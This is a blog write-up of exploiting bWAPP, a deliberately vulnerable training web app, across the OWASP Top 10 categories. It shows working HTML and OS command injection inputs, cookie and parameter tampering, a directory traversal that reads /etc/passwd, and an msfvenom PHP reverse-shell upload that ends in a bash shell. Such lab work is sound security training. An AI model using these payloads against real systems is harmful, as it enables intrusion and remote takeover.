---
title:    "bWAPP writeup"
date:     2019-03-17
category:	Cybersecurity writeup
comment:  header sizes are 2000x750
header:
  image:    assets/images/2019-03-17-bwapp-writeup/header.jpg
  teaser:   assets/images/2019-03-17-bwapp-writeup/header.jpg
  caption:  "Photo credit: [**Unsplash**](https://unsplash.com)"
---

bWAPP is a PHP application specifically designed to be exploited. It contains many bugs and vulnerabilities, and allows you to select the security level, similar to the well known Damn Vulnerable Web Application. You can download it [here](http://itsecgames.com/).

The way this writeup is structured follows the vulnerability list in bWAPP itself. There are a total of 10 categories (from A1 to A10) which correspond to the [OWASP Top 10 Application Security Risks](https://www.owasp.org/index.php/Top_10-2017_Top_10), plus an additional other two categories.

Inside each A-category, there are multiple vulnerabilities to exploit, which are further subdivided in difficulty levels (low, medium, or high). Generally speaking, all vulnerabilities that work in "high" would also work in a "low" setting, but not the other way around. In this writeup, I will only publish the highest level I was able to exploit unless the lower levels are relevant (for example, because "low" and "medium" are essentially the same exploit, but in the "medium" setting I used some form of obfuscation to fool protection measures).

This is a small subset of vulnerabilities I have found interesting while playing around with the machine. There are some vulnerabilities that require you to use [bee-box](https://www.vulnhub.com/entry/bwapp-bee-box-v16,53/), because it bundles other services, apart from an HTTP webapp, such as FTP or Samba. In my case, I used the [Vulnerable Web Apps](http://www.vulnerablewebapps.org/) project, which collects and bundles many different pentesting training apps in a single VM, therefore, the vulnerabilities that required me to use bee-box were unavailable to me.

# A1 - Injection

## HTML Injection - Reflected (GET)

### Low

```
http://10.99.50.177/bWAPP/htmli_get.php?firstname=%3Ch1%3EInjection!%3C%2Fh1%3E&lastname=%3Ch2%3Epwnd%3C%2Fh2%3E&form=submit
```

### Medium

```
http://10.99.50.177/bWAPP/htmli_get.php?firstname=%253Ch1%253EMedium%253C%252Fh1%253E&lastname=%253Ch2%253EMedium%253C%252Fh2%253E&form=submit
```

## HTML Injection - Reflected (POST)

### Medium

Like the previous one, you can URL Encode any value. For example: `%3Ch1%3Emedium%3C%2Fh1%3E`.

![HTML Injection - Reflected (POST)](/assets/images/2019-03-17-bwapp-writeup/1.png)

## HTML Injection - Reflected (Current URL)

### Low

Using Burp Suite, you can intercept and replace the "Host" header and inject
whatever code you wish.

![HTML Injection - Reflected (Current URL)](/assets/images/2019-03-17-bwapp-writeup/2.png)
![HTML Injection - Reflected (Current URL)](/assets/images/2019-03-17-bwapp-writeup/3.png)

## HTML Injection - Stored (Blog)

### Low

The blog entry can have any HTML code.

![HTML Injection - Stored (Blog)](/assets/images/2019-03-17-bwapp-writeup/4.png)

## iFrame Injection

### Low

You can simply replace the URL parameter with anything you wish. In this case, I
inject the page itself into it.

![iFrame Injection](/assets/images/2019-03-17-bwapp-writeup/5.png)

## OS Command Injection

### Medium

This will run a DNS lookup query through a shell prompt. Using pipes, you can
append any arbitrary commands, which will be executed by the PHP server.

Exploiting this is as simple as serving a shell script that will try to connect
back to you with a shell session.

`www.nsa.gov | echo hacked`

![OS Command Injection](/assets/images/2019-03-17-bwapp-writeup/6.png)

## OS Command Injection (Blind)

Because this one doesn't show any output, we can't see the output of the shell.
The previous exploit still applies, but you can also run complex commands using
`if` statements and setting sleep timers whenever you want.

In this case, if the page takes exactly 2 seconds (and a little bit longer, because
of the HTTP server) to reload, it means our command executed successfully.

`www.nsa.gov | sleep 2`

# A2 - Broken Authentication and Session Management

## Broken Authentication - Logout Management

### Low

To exploit this, open the "log out" link in a new tab. The new tab will have
logged you out, but the original tab is still logged in.

## Session Management - Administrative Portals

### Low

```
http://10.99.50.177/bWAPP/smgmt_admin_portal.php?admin=1
```

### High

Intercept the request with Burp Suite and modify the "admin" cookie from 0 to 1.

![Session Management - Administrative Portals](/assets/images/2019-03-17-bwapp-writeup/7.png)

## Session Management - Session ID in URL

### Low

The web application exposes the value of the `PHPSESSID` cookie right in the browser's address bar.

In this situation, an attacker who is able to inject malicious JavaScript code into the webpage (for example, by modifying legitimate resource requests to JS libraries hosted on CDNs like jQuery), can retrieve the cookie value by reading `document.location.href`.

![Session Management - Session ID in URL](/assets/images/2019-03-17-bwapp-writeup/8.png)

# A3 - Cross Site Scripting (XSS)

## Cross Site Scripting - Stored (User Agent)

### Medium

The application parses data directly from the user agent. You can inject any code you want, including malicious JS payloads that will get executed when someone navigates to that page.

With Burp, you can replace the User-Agent header.

![Cross Site Scripting - Stored (User Agent)](/assets/images/2019-03-17-bwapp-writeup/9.png)
![Cross Site Scripting - Stored (User Agent)](/assets/images/2019-03-17-bwapp-writeup/10.png)

# A6 - Sensitive Data Exposure

## HTML5 Web Storage (Secret)

The application defines secrets within the HTML page presented to the user.

In this situation, a malicious user who is able to inject JS code into the page
would be able to retrieve any secrets by reading the variables `localStorage.login`
and `localStorage.secret`.

Below is the HTML fragment where those variables are defined

![HTML5 Web Storage (Secret)](/assets/images/2019-03-17-bwapp-writeup/11.png)

```html
<script>if(typeof(Storage) !== "undefined")
      {
        localStorage.login = "bee";
        localStorage.secret = "83785efbbef1b4cdf3260c5e6505f7d2261f738d";
      }
      else
      {
        alert("Sorry, your browser does not support web storage...");
      }</script>
```

The `localStorage.secret` variable looks like a hash.

When hashes are very common, they can simply be searched in any search engine.
You can assume that simple passwords like `password` or `12345` will have their
hashes precomputed and indexed by most search engines. Doing this means you don't
need to bruteforce the hash which could take a very long time. Maybe this is the
case here too. Let's check!

![HTML5 Web Storage (Secret)](/assets/images/2019-03-17-bwapp-writeup/12.png)

Apparently the hash belongs to the `Any bugs?` string. This can be confirmed by
lowering the security level, because in the "low" setting, bWAPP will send the
secret in clear text.

# A7 - Missing Functional Access Level Control

## Directory Traversal - Directories

### Medium

We can simply tell bWAPP to open the `/` directory.

```
http://10.99.50.177/bWAPP/directory_traversal_1.php?page=/
```

## Directory Traversal - Files

### Medium

We can also instruct bWAPP to open arbitrary files in the file system using
absolute filesystem paths.

```
http://10.99.50.177/bWAPP/directory_traversal_1.php?page=/etc/passwd
```

## Restrict Device Access

### Medium

Using Burp Suite, it's trivial to change the UserAgent string.

`Mozilla/5.0 (iPhone; CPU iPhone OS 11_0 like Mac OS X) AppleWebKit/604.1.38 (KHTML, like Gecko) Version/11.0 Mobile/15A356 Safari/604.1`

![Restrict Device Acces](/assets/images/2019-03-17-bwapp-writeup/13.png)

Once we forward the modified request, we are granted access.

![Restrict Device Acces](/assets/images/2019-03-17-bwapp-writeup/14.png)

# Other bugs

## Unrestricted File Upload

### Low

Generate payload and upload it.

```
$ msfvenom -p php/meterpreter_reverse_tcp LHOST=10.99.9.90 LPORT=9988 -f raw > shell.php
```

Open a meterpreter session.

```
$ msfconsole
[...]
msf5 > use exploit/multi/handler
msf5 exploit(multi/handler) > set PAYLOAD php/meterpreter_reverse_tcp
PAYLOAD => php/meterpreter_reverse_tcp
msf5 exploit(multi/handler) > set LHOST 10.99.9.90
LHOST => 10.99.9.90
msf5 exploit(multi/handler) > set LPORT 9988
LPORT => 9988
msf5 exploit(multi/handler) > set ExitOnSession false
ExitOnSession => false
msf5 exploit(multi/handler) > exploit -j -z
[*] Exploit running as background job 0.
[*] Exploit completed, but no session was created.

[*] Started reverse TCP handler on 10.99.9.90:9988 
msf5 exploit(multi/handler) > 
```

Now, we execute the "image" by typing its URL in our browser. In my case
`http://10.99.50.177/bWAPP/images/shell.php`. This activates the shell and will
try to make a connection to our Metasploit session.

Back to the Metasploit console.

```
msf5 exploit(multi/handler) > sessions -l

Active sessions
===============

  Id  Name  Type                   Information                        Connection
  --  ----  ----                   -----------                        ----------
  1         meterpreter php/linux  www-data (33) @ vulnerablewebapps  10.99.9.90:9988 -> 10.99.50.177:36358 (10.99.50.177)
msf5 exploit(multi/handler) > sessions 1
[*] Starting interaction with 1...
meterpreter > shell
Process 5446 created.
Channel 0 created.
whoami
www-data
/bin/bash -i
bash: cannot set terminal process group (1114): Inappropriate ioctl for device
bash: no job control in this shell
www-data@vulnerablewebapps:/var/www/html/bWAPP/images$ 
```

We have a fully featured Bash shell now. We can now proceed with privilege escalation.
